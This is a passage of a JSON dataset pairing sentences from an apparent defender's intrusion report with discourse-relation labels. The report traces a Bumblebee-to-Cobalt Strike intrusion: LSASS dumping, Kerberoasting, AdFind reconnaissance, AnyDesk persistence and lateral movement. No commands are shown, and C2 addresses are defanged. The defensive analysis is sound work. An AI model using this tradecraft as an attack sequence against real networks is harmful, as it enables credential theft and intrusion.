        "S2": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "S2": "The Emotet mailer started roughly once each day during the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Emotet mailer started roughly once each day during the intrusion.",
        "S2": "Marked by bursts of connection to various email servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Marked by bursts of connection to various email servers.",
        "S2": "The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.",
        "S2": "We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.",
        "S2": "We have a case coming up in a few weeks where it does exactly that.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion, the threat actors operated in an environment over an 11 day dwell period.",
        "S2": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
        "S2": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",
        "relation": "NEXT"
    },
    {
        "S1": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",
        "S2": "When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.",
        "relation": "NEXT"
    },
    {
        "S1": "When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.",
        "S2": "From there, the loader reached out to the Bumblebee C2 servers.",
        "relation": "NEXT"
    },
    {
        "S1": "From there, the loader reached out to the Bumblebee C2 servers.",
        "S2": "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
        "S2": "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
        "relation": "NEXT"
    },
    {
        "S1": "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
        "S2": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "relation": "NEXT"
    },
    {
        "S1": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "S2": "Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.",
        "S2": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
        "S2": "The threat actor then started Active Directory discovery using Adfind.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then started Active Directory discovery using Adfind.",
        "S2": "After this activity, the threat actors went silent.",
        "relation": "NEXT"
    },
    {
        "S1": "After this activity, the threat actors went silent.",
        "S2": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
        "relation": "NEXT"
    },
    {
        "S1": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
        "S2": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "relation": "NEXT"
    },
    {
        "S1": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "S2": "AdFind was used again as well.",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind was used again as well.",
        "S2": "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
        "S2": "They then used remote services to execute Procdump, which was used to dump LSASS.",
        "relation": "NEXT"
    },
    {
        "S1": "They then used remote services to execute Procdump, which was used to dump LSASS.",
        "S2": "At this point, the actors appeared to be searching for more access then they currently had.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point, the actors appeared to be searching for more access then they currently had.",
        "S2": "While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.",
        "relation": "NEXT"
    },
    {
        "S1": "While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.",
        "S2": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
        "relation": "NEXT"
    },
    {
        "S1": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
        "S2": "Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery.",
        "relation": "NEXT"
    },
    {
        "S1": "Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery.",
        "S2": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "S2": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
        "S2": "After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.",
        "relation": "NEXT"
    },
    {
        "S1": "After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.",
        "S2": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "S2": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
        "S2": "These batch scripts\u2019 purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.",
        "relation": "NEXT"
    },
    {
        "S1": "These batch scripts\u2019 purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.",
        "S2": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
        "S2": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "S2": "This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.",
        "S2": "The threat actors were then evicted from the environment before any final actions could be taken.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were then evicted from the environment before any final actions could be taken.",
        "S2": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.",
        "S2": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "S2": "The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:",
        "relation": "NEXT"
    },
    {
        "S1": "The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:",
        "S2": "Running Eric Zimmerman\u2019s tool LECmd revealed additional details related to the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "Running Eric Zimmerman\u2019s tool LECmd revealed additional details related to the threat actors.",
        "S2": "The metadata included TA machine\u2019s hostname, MAC address, and the LNK document creation date:",
        "relation": "MISC"
    },
    {
        "S1": "The metadata included TA machine\u2019s hostname, MAC address, and the LNK document creation date:",
        "S2": "The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
        "S2": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:",
        "S2": "Sysmon File Created event showing wab.exe created by rundll32.exe",
        "relation": "MISC"
    },
    {
        "S1": "Sysmon File Created event showing wab.exe created by rundll32.exe",
        "S2": "Sysmon Event Code 1 showing wab.exe executed by WMI",
        "relation": "ELABORATION"
    },
    {
        "S1": "Sysmon Event Code 1 showing wab.exe executed by WMI",
        "S2": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:",
        "relation": "NEXT"
    },
    {
        "S1": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:",
        "S2": "Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.",
        "S2": "This payload can be deobfuscated using the following CyberChef recipe:",
        "relation": "MISC"
    },
    {
        "S1": "This payload can be deobfuscated using the following CyberChef recipe:",
        "S2": "Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike:",
        "relation": "NEXT"
    },
    {
        "S1": "Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike:",
        "S2": "One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool:",
        "relation": "MISC"
    },
    {
        "S1": "One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool:",
        "S2": "The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",
        "relation": "MISC"
    },
    {
        "S1": "The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",
        "S2": "The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section.",
        "S2": "AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.",
        "relation": "MISC"
    },
    {
        "S1": "AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.",
        "S2": "Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).",
        "S2": "The parent process of this command was C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The parent process of this command was C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:",
        "S2": "This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.",
        "S2": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.",
        "S2": "Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",
        "S2": "They also utilized local administrator accounts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also utilized local administrator accounts.",
        "S2": "A service account, with Domain Admin permissions, was used to create a remote service on a Domain Controller to move laterally.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A service account, with Domain Admin permissions, was used to create a remote service on a Domain Controller to move laterally.",
        "S2": "The process injection technique was used multiple times to inject into different processes.",
        "relation": "MISC"
    },
    {
        "S1": "The process injection technique was used multiple times to inject into different processes.",
        "S2": "Almost every post-exploitation job was launched from an injected process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Almost every post-exploitation job was launched from an injected process.",
        "S2": "Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:",
        "S2": "Threat actors also created a remote thread in svchost.exe:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors also created a remote thread in svchost.exe:",
        "S2": "Multiple processes were then spawned by :",
        "relation": "NEXT"
    },
    {
        "S1": "Multiple processes were then spawned by :",
        "S2": "to perform various techniques (Enumeration, Credential dumping, etc.):",
        "relation": "ELABORATION"
    },
    {
        "S1": "to perform various techniques (Enumeration, Credential dumping, etc.):",
        "S2": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.",
        "S2": "Indicator Removal on Host: File Deletion",
        "relation": "MISC"
    },
    {
        "S1": "Indicator Removal on Host: File Deletion",
        "S2": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "S2": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:",
        "S2": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "S2": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:",
        "S2": "The ProcDump utility was executed on those workstations using the following command line:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ProcDump utility was executed on those workstations using the following command line:",
        "S2": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "relation": "MISC"
    },
    {
        "S1": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "S2": "Here is an extract of PowerShell EventID 800 showing different Invoke-Kerberoast options used by threat actors, including HashCat output format:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here is an extract of PowerShell EventID 800 showing different Invoke-Kerberoast options used by threat actors, including HashCat output format:",
        "S2": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "relation": "NEXT"
    },
    {
        "S1": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "S2": "Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.",
        "S2": "We assess with high confidence that the service account password was weak and cracked offline by threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess with high confidence that the service account password was weak and cracked offline by threat actors.",
        "S2": "System Information & Software Discovery",
        "relation": "MISC"
    },
    {
        "S1": "System Information & Software Discovery",
        "S2": "The following commands were launched by the wab.exe beacon:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following commands were launched by the wab.exe beacon:",
        "S2": "Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely:",
        "S2": "As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:",
        "S2": "Threat actors failed on a part of their tasks, by executing the command in the wrong console:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors failed on a part of their tasks, by executing the command in the wrong console:",
        "S2": "We can assert with high confidence that the recon stage was not fully automated, and threat actors manually executed commands and made a mistake in one of those.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can assert with high confidence that the recon stage was not fully automated, and threat actors manually executed commands and made a mistake in one of those.",
        "S2": "To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions:",
        "relation": "MISC"
    },
    {
        "S1": "To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions:",
        "S2": "The source of execution, the initiating parent process, was different on each occasion and the name of AdFind binary and the result files were different on one occasion, which could indicate multiple Threat actors accessing the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The source of execution, the initiating parent process, was different on each occasion and the name of AdFind binary and the result files were different on one occasion, which could indicate multiple Threat actors accessing the network.",
        "S2": "Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files:",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files:",
        "S2": "Both of those scripts were executed from the PowerShell Cobalt Strike beacon (powershell.exe).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both of those scripts were executed from the PowerShell Cobalt Strike beacon (powershell.exe).",
        "S2": "Invoke-ShareFinder is a PowerShell module which is part of PowerView.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Invoke-ShareFinder is a PowerShell module which is part of PowerView.",
        "S2": "Invoke-ShareFinder \u2013 finds (non-standard) shares on hosts in the local domain",
        "relation": "LIST"
    },
    {
        "S1": "Invoke-ShareFinder \u2013 finds (non-standard) shares on hosts in the local domain",
        "S2": "Threat actors performed share enumeration using Invoke-ShareFinder.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors performed share enumeration using Invoke-ShareFinder.",
        "S2": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\.",
        "S2": "The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",
        "relation": "MISC"
    },
    {
        "S1": "The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",
        "S2": "Seatbelt is a C# project that performs a number of security oriented host-survey \u201csafety checks\u201d relevant from both offensive and defensive security perspectives.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Seatbelt is a C# project that performs a number of security oriented host-survey \u201csafety checks\u201d relevant from both offensive and defensive security perspectives.",
        "S2": "Threat actors performed a full reconnaissance by specifying the flag -group=all :",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors performed a full reconnaissance by specifying the flag -group=all :",
        "S2": "Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.",
        "S2": "This is the first time we\u2019ve observed this tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is the first time we\u2019ve observed this tool.",
        "S2": "This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration.",
        "relation": "MISC"
    },
    {
        "S1": "This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration.",
        "S2": "The table below summarizes the capabilities of the tool:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The table below summarizes the capabilities of the tool:",
        "S2": "Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping:",
        "relation": "MISC"
    },
    {
        "S1": "Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping:",
        "S2": "Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.",
        "S2": "Below are all the command lines run by the adversaries:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below are all the command lines run by the adversaries:",
        "S2": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "relation": "MISC"
    },
    {
        "S1": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "S2": "The threat actors also transferred ProcDump from the beachhead to multiple workstations:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also transferred ProcDump from the beachhead to multiple workstations:",
        "S2": "Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:",
        "S2": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:",
        "S2": "This first lateral movement was performed in order to drop and install AnyDesk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This first lateral movement was performed in order to drop and install AnyDesk.",
        "S2": "Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into:",
        "relation": "MISC"
    },
    {
        "S1": "Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into:",
        "S2": "These RPC connections targeted multiple hosts, including workstations, servers, and DCs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These RPC connections targeted multiple hosts, including workstations, servers, and DCs.",
        "S2": "As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.",
        "S2": "Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.",
        "S2": "On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. \u201c<7-alphanumeric-characters>.exe\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. \u201c<7-alphanumeric-characters>.exe\u201d.",
        "S2": "Below is an example of the service edc603a that was created on a Domain Controller:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is an example of the service edc603a that was created on a Domain Controller:",
        "S2": "The account used to perform this lateral movement was one of the kerberoasted service accounts.",
        "relation": "MISC"
    },
    {
        "S1": "The account used to perform this lateral movement was one of the kerberoasted service accounts.",
        "S2": "The service runs a rundll32.exe process without any arguments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The service runs a rundll32.exe process without any arguments.",
        "S2": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "S2": "We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)",
        "relation": "NEXT"
    },
    {
        "S1": "We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)",
        "S2": "The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into:",
        "relation": "MISC"
    },
    {
        "S1": "The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into:",
        "S2": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
        "S2": "Two CS C2 servers were used during this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two CS C2 servers were used during this intrusion.",
        "S2": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):",
        "relation": "ELABORATION"
    },
    {
        "S1": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):",
        "S2": "The main beacon wab.exe:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main beacon wab.exe:",
        "S2": "The PowerShell beacon:",
        "relation": "LIST"
    },
    {
        "S1": "The PowerShell beacon:",
        "S2": "The threat actors used default CS configuration and default named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used default CS configuration and default named pipes.",
        "S2": "Named pipes were created in order to establish communication between CS processes:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Named pipes were created in order to establish communication between CS processes:",
        "S2": "In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4} .",
        "relation": "MISC"
    },
    {
        "S1": "In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4} .",
        "S2": "Below is the full list of all default named pipes spotted during this intrusion:",
        "relation": "MISC"
    },
    {
        "S1": "Below is the full list of all default named pipes spotted during this intrusion:",
        "S2": "Named pipes are commonly used by Cobalt Strike to perform various techniques.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Named pipes are commonly used by Cobalt Strike to perform various techniques.",
        "S2": "Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st.",
        "S2": "As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:",
        "S2": "A new service was created (Event ID 7045) upon the execution of AnyDesk installer:",
        "relation": "NEXT"
    },
    {
        "S1": "A new service was created (Event ID 7045) upon the execution of AnyDesk installer:",
        "S2": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
        "S2": "The usage of AnyDesk can be relatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user agent, etc.):",
        "relation": "ELABORATION"
    },
    {
        "S1": "The usage of AnyDesk can be relatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user agent, etc.):",
        "S2": "The usage of AnyDesk also triggered two ET signatures:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The usage of AnyDesk also triggered two ET signatures:",
        "S2": "ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent",
        "relation": "ELABORATION"
    },
    {
        "S1": "ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent",
